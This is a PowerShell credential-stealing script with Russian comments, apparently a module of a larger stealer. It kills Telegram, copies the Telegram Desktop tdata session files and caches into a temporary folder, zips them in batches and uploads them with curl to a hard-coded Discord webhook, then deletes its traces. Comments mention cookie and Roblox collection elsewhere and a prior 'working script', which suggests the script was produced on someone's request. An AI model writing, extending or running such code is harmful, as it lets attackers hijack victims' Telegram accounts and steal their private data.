$webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"
try { $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { $hwid = "UNKNOWN_HWID" }
$d = "$env:TEMP\$hwid"
if (Test-Path $d) { Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -Path $d -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

# [Остальная часть сбора кук, роблокса и информации остаётся без изменений...]
# (Сбор кук, Roblox, info — как в твоём последнем рабочем скрипте)

# ===== НОВАЯ ЧАСТЬ: Telegram tdata с рекурсивным копированием =====
$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
if (Test-Path $tgPath) {
    # Закрываем Telegram
    Get-Process -Name "Telegram" -ErrorAction SilentlyContinue | Stop-Process -Force
    Get-Process -Name "TelegramDesktop" -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 2

    $tgRoot = "$env:TEMP\Telegram_$hwid"
    if (Test-Path $tgRoot) { Remove-Item $tgRoot -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -Path $tgRoot -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    # --- 1. Копируем папку D877F783D5D3EF8C целиком (рекурсивно) ---
    $specialDir = Join-Path $tgPath "D877F783D5D3EF8C"
    if (Test-Path $specialDir) {
        $destDir = Join-Path $tgRoot "D877F783D5D3EF8C"
        # Копируем всю папку рекурсивно, сохраняя структуру
        Copy-Item -Path $specialDir -Destination $destDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[✓] Папка D877F783D5D3EF8C скопирована целиком" -ForegroundColor Green
    }

    # --- 2. Копируем user_data/cache (рекурсивно) ---
    $cacheDir = Join-Path $tgPath "user_data\cache"
    if (Test-Path $cacheDir) {
        $items = Get-ChildItem -Path $cacheDir -Directory -ErrorAction SilentlyContinue
        foreach ($item in $items) {
            $destDir = Join-Path $tgRoot "tdata_userdatacache$($item.Name)"
            # Копируем каждую папку с номером целиком
            Copy-Item -Path $item.FullName -Destination $destDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        Write-Host "[✓] Папки user_data/cache скопированы" -ForegroundColor Green
    }

    # --- 3. Копируем user_data/media_cache (рекурсивно) ---
    $mediaCacheDir = Join-Path $tgPath "user_data\media_cache"
    if (Test-Path $mediaCacheDir) {
        $items = Get-ChildItem -Path $mediaCacheDir -Directory -ErrorAction SilentlyContinue
        foreach ($item in $items) {
            $destDir = Join-Path $tgRoot "tdata_userdatamediacache$($item.Name)"
            # Копируем каждую папку с номером целиком
            Copy-Item -Path $item.FullName -Destination $destDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        Write-Host "[✓] Папки user_data/media_cache скопированы" -ForegroundColor Green
    }

    # --- 4. Копируем корневые файлы tdata (не в папках) ---
    $rootFiles = Get-ChildItem -Path $tgPath -File -ErrorAction SilentlyContinue
    $counter = 1
    $destDir = Join-Path $tgRoot "tdata"
    if ($rootFiles.Count -gt 0) {
        if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
        foreach ($f in $rootFiles) {
            # Переименовываем файлы с номером в скобках
            $newName = "$($f.Name)($counter)"
            $destFile = Join-Path $destDir $newName
            Copy-Item -Path $f.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
            $counter++
        }
        Write-Host "[✓] Корневые файлы tdata скопированы" -ForegroundColor Green
    }

    # --- 5. Копируем папки dumps и emoji (если они есть) ---
    # По твоему запросу они НЕ копируются, поэтому пропускаем

    # --- 6. Отправка собранных файлов (батчами по 7 МБ) ---
    $tgFiles = Get-ChildItem -Path $tgRoot -Recurse -File
    if ($tgFiles.Count -gt 0) {
        Write-Host "[*] Собрано $($tgFiles.Count) файлов из Telegram. Отправляю..." -ForegroundColor Cyan
        
        $batch = @()
        $batchSize = 0
        $batchId = 1
        foreach ($tf in $tgFiles) {
            $fsize = $tf.Length
            if ($fsize -le 4MB) {
                if ($batchSize + $fsize -gt 7MB -and $batch.Count -gt 0) {
                    $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
                    New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
                    foreach ($bf in $batch) {
                        $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
                        $destFile = Join-Path $batchDir $relPath
                        $destDir = Split-Path $destFile -Parent
                        if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
                        Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
                    }
                    $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
                    try {
                        [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
                    } catch {}
                    if (Test-Path $batchZip) {
                        curl.exe -s -F "file=@$batchZip" $webhook
                    }
                    Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
                    Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
                    $batch = @()
                    $batchSize = 0
                    $batchId++
                }
                $batch += $tf
                $batchSize += $fsize
            } else {
                $tempFile = "$env:TEMP\$($tf.Name)"
                Copy-Item -Path $tf.FullName -Destination $tempFile -Force -ErrorAction SilentlyContinue
                curl.exe -s -F "file=@$tempFile" $webhook
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            }
        }
        if ($batch.Count -gt 0) {
            $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
            New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
            foreach ($bf in $batch) {
                $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
                $destFile = Join-Path $batchDir $relPath
                $destDir = Split-Path $destFile -Parent
                if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
                Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
            }
            $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
            try {
                [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
            } catch {}
            if (Test-Path $batchZip) {
                curl.exe -s -F "file=@$batchZip" $webhook
            }
            Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
            Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    Remove-Item $tgRoot -Recurse -Force -ErrorAction SilentlyContinue
}
